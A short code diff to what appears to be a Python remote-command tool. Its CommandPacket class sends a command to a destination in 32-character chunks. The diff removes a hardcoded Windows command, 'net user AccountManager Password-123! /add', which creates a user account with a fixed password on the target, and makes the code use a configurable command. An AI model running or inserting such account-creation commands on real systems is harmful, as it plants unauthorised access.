@@ -23,13 +23,11 @@ class CommandPacket(Packet):
     def sendCommandPacket(self, destination):
         baseline = "\x1c\x01\x11\xe9\x00\x00\x00\x00\x00\x00\x00"
 
-        self.command = "net user AccountManager Password-123! /add"
-
-        if len(cmd) > 32:
-            cmdArr = [cmd[i:i+32] for i in range(0, len(cmd), 32)]
+        if len(self.command) > 32:
+            cmdArr = [self.command[i:i+32] for i in range(0, len(self.command), 32)]
             print(cmdArr)
         else:
-            cmdArr = [cmd]
+            cmdArr = [self.command]
 
         for ctr in range(0, len(cmdArr)):
             if ctr < len(cmdArr)-1:
